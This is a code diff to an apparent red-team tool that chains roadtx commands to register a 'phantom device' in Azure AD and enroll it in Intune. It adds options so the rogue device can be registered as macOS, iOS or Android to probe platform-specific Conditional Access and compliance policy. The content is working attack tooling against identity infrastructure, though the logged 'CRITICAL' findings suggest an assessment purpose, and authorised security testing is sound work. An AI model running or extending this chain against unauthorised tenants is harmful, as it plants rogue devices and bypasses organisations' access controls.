@@ -294,6 +294,11 @@ class ChainState:
     password: str
     domain: str
     device_name: str
+    # Registered device OS type — Windows (roadtx default), macOS, iOS, or
+    # Android. Registering as a non-Windows platform probes platform-scoped
+    # Conditional Access / Intune compliance that a Windows join wouldn't hit.
+    device_type: str = "Windows"
+    os_version: str = ""
 
     # Phase 2 outputs
     drs_token_file: str = ".roadtools_auth"
@@ -435,13 +440,18 @@ def phase_2_drs_token(state: ChainState, log: Logger, dry_run: bool) -> bool:
 def phase_3_register_device(state: ChainState, log: Logger, dry_run: bool) -> bool:
     """Register a phantom device in Azure AD."""
     log.phase(3, PHASE_NAMES[3])
-    log.info(f"Registering phantom device: {state.device_name}")
+    log.info(f"Registering phantom device: {state.device_name} "
+             f"· type={state.device_type}"
+             + (f" {state.os_version}" if state.os_version else ""))
 
-    rc, stdout, stderr = run_cmd([
-        "roadtx", "device",
-        "-a", "join",
-        "-n", state.device_name,
-    ], log, dry_run)
+    cmd = ["roadtx", "device", "-a", "join", "-n", state.device_name]
+    # roadtx defaults to a Windows device; only pass --device-type when the
+    # operator picked something else so default runs are byte-for-byte unchanged.
+    if state.device_type and state.device_type.lower() != "windows":
+        cmd += ["--device-type", state.device_type]
+    if state.os_version:
+        cmd += ["--os-version", state.os_version]
+    rc, stdout, stderr = run_cmd(cmd, log, dry_run)
 
     combined = stdout + stderr
 
@@ -467,6 +477,7 @@ def phase_3_register_device(state: ChainState, log: Logger, dry_run: bool) -> bo
 
         log.finding("CRITICAL", "Phantom Device Registered",
                      f"Successfully registered phantom device '{state.device_name}' "
+                     f"(OS type: {state.device_type}) "
                      f"in Azure AD without TPM, hardware verification, or admin approval. "
                      f"DRS accepted the join request using only a valid token. "
                      f"Device ID: {state.device_id or 'see certificate'}",
@@ -926,6 +937,8 @@ def run_chain(args: argparse.Namespace):
         password=args.password,
         domain=args.domain,
         device_name=args.device_name,
+        device_type=args.device_type,
+        os_version=(args.os_version or ""),
     )
 
     if args.intune_host:
@@ -1036,6 +1049,12 @@ Examples:
     device = parser.add_argument_group("Device Configuration")
     device.add_argument("--device-name", default=None,
                         help="Phantom device name (default: auto-generated)")
+    device.add_argument("--device-type", default="Windows",
+                        help="Registered device OS type: Windows (default), "
+                             "macOS, iOS, or Android. A non-Windows join probes "
+                             "platform-scoped Conditional Access / Intune policy.")
+    device.add_argument("--os-version", default=None,
+                        help="Registered device OS version (roadtx default if unset)")
 
     intune_grp = parser.add_argument_group("Intune Enrollment (Phase 8-9)")
     intune_grp.add_argument("--intune", action="store_true",
